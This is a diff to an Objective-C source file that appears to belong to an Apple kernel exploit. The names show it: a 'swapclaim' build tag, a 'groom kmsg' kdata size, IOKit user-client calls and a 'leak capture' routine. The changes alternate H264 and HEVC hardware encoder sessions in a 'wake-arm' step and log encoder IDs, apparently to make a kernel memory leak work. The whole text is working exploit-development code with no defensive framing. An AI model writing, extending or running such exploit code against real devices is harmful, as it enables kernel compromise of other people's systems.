@@ -107,7 +107,7 @@ static void p110_flushCB(void *r, void *e, OSStatus st, VTEncodeInfoFlags f, CMS
 #import <IOKit/IOKitLib.h>       /* dlsym'd calls still; only the UC types  */
 #import <sys/qos.h>
 
-#define P110_BUILD      @"p110-swapclaim-v4.1-iosurfpb"
+#define P110_BUILD      @"p110-swapclaim-v4.2-h264spec"
 #define P110_GROOM_KDATA 0x1000        /* the groom kmsg's kdata size       */
 #define P110_ROUNDS     64
 #define P110_PREFILL_MAX  8     /* bandit arm room: prefill 6 (default) vs 8 */
@@ -690,9 +690,18 @@ static BOOL p110_leak_capture(NSString *tag, BOOL print, P110LeakSnap *snap) {
             int woke = 0;
             for (int wc = 0; wc < 3 && woke == 0; wc++) {
                 VTCompressionSessionRef ws = NULL;
+                /* v4.2: HEVC HW-encode failed async (-17691) with clean
+                   properties and an IOSurface-backed buffer — test H264 for
+                   even cycles and request the HW encoder in the CREATE spec
+                   (the property route was rejected pre-v4.0). */
+                CMVideoCodecType wCodec = (wc % 2 == 0) ? kCMVideoCodecType_H264
+                                                        : kCMVideoCodecType_HEVC;
+                NSDictionary *wSpec = @{
+                    (id)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES };
                 OSStatus wst = VTCompressionSessionCreate(
-                    kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
-                    NULL, NULL, NULL, p110_flushCB, NULL, &ws);
+                    kCFAllocatorDefault, 1280, 720, wCodec,
+                    (__bridge CFDictionaryRef)wSpec, NULL, NULL,
+                    p110_flushCB, NULL, &ws);
                 if (wst != noErr || !ws) {
                     Lf(@"[leak] WAKE-ARM cycle %d: session-create st=%d — the "
                        @"VT encoder did not open (no engine to wake)", wc, (int)wst);
@@ -740,11 +749,21 @@ static BOOL p110_leak_capture(NSString *tag, BOOL print, P110LeakSnap *snap) {
                         if (est == noErr && wcb > 0) woke = 1;
                     }
                 }
-                Lf(@"[leak] WAKE-ARM cycle %d: create=0 prep=%d encode=%d "
+                NSString *wEncId = nil;
+                if (ws) {
+                    CFTypeRef eid = NULL;
+                    if (VTSessionCopyProperty(ws, (__bridge CFStringRef)@"EncoderID",
+                                              kCFAllocatorDefault, &eid) == noErr && eid) {
+                        wEncId = [NSString stringWithFormat:@"%@", eid];
+                        CFRelease(eid);
+                    }
+                }
+                Lf(@"[leak] WAKE-ARM cycle %d [codec=%@ enc=%@]: create=0 prep=%d encode=%d "
                    @"callbacks=%d lastSt=%d samples=%d props[usage=%d rc=%d hw=%d rt=%d] "
                    @"(v3.9: every property status logged; rc!=0 = the RCMode "
                    @"pack value rejected — the -12900 class)",
-                   wc, (int)wprep, (int)est,
+                   wc, (wCodec == kCMVideoCodecType_H264) ? @"h264" : @"hevc",
+                   wEncId ?: @"?", (int)wprep, (int)est,
                    atomic_load(&g_p110_wakeCb), atomic_load(&g_p110_wakeSt), wcb,
                    (int)wStUsage, (int)wStRC, (int)wStHW, (int)wStRT);
                 VTCompressionSessionInvalidate(ws);
